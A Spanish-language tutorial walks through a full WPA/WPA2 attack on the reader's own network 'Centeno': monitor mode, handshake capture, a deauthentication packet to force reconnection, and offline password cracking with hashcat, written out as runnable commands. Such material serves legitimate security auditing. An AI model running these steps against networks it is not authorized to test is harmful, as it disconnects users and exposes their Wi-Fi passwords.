Guia definitiva para auditoria inalambrica wpa y wpa2 en entorno linux, con ejemplos completos usando tu tarjeta wlo1 y tu red de ejemplo llamada Centeno.

### Fase 0: Identificar la tarjeta de red inalambrica
Abre una terminal y ejecuta el siguiente comando para ver las interfaces de red de tu laptop:

`ip link`

Busca en la lista el nombre de tu tarjeta inalambrica, que en tu caso es `wlo1`.

### Fase 1: Preparacion de la tarjeta y modo monitor
Para que tu antena escuche el aire libre de interferencias, ejecuta:

`sudo airmon-ng check kill
`
Este comando detiene los servicios automaticos del sistema que bloquean la placa. A continuacion, activa el modo monitor sobre tu tarjeta `wlo1` ejecutando:

`sudo airmon-ng start wlo1`

Esto dejara lista la antena para capturar trafico (la interfaz operativa seguira siendo `wlo1` o el sistema le asignara un sufijo como `wlo1mon`).

### Fase 2: Escaneo y captura del handshake
Ejecuta el escaneo de redes cercanas utilizando tu interfaz:

`sudo airodump-ng wlo1`

Observa las columnas en pantalla hasta ubicar el nombre de tu red en la columna ESSID (por ejemplo, Centeno). Anota obligatoriamente dos datos clave que aparecen en esa misma linea:

- El BSSID (la direccion MAC fisica del router, por ejemplo: `44:9B:C1:51:54:BC`).
    
- El canal (CH, por ejemplo: `10`).
    
    Una vez anotados, presiona las teclas Ctrl + C para detener el escaneo.
    

Ahora inicia la grabacion exclusiva del trafico de tu red reemplazando los datos por los que anotaste:

`sudo airodump-ng -c 10 --bssid 44:9B:C1:51:54:BC -w centeno_captura wlo1`

Deja esta ventana abierta y parpadeando.

Para forzar el intercambio del handshake, abre una segunda terminal y envia un paquete de desautenticacion rapido hacia el router:

`sudo aireplay-ng --deauth 1 -a 44:9B:C1:51:54:BC wlo1`

Mira la esquina superior derecha de la primera terminal: aparecera un aviso destacado que dice WPA handshake seguido de la MAC del router. Eso confirma la captura exitosa. Ya puedes cerrar ambas terminales.
### Fase 3: Conversion y analisis offline con hashcat

Traduce el archivo de captura obtenido (.cap) al formato moderno que lee hashcat (modo 22000) ejecutando:

`hcxpcapngtool -o hash_red.22000 centeno_captura-01.cap`

Finalmente, lanza la comprobacion comparando el hash contra tu diccionario de prueba llamado diccionario.txt:

`hashcat -m 22000 -a 0 hash_red.22000 diccionario.txt`

Si la clave forma parte del archivo de texto, hashcat la mostrara en pantalla; si finaliza indicando Exhausted, significa que la contraseña no estaba en ese diccionario. Para volver a tener internet normal despues de la practica, reinicia tu computadora o ejecuta `sudo systemctl start NetworkManager`.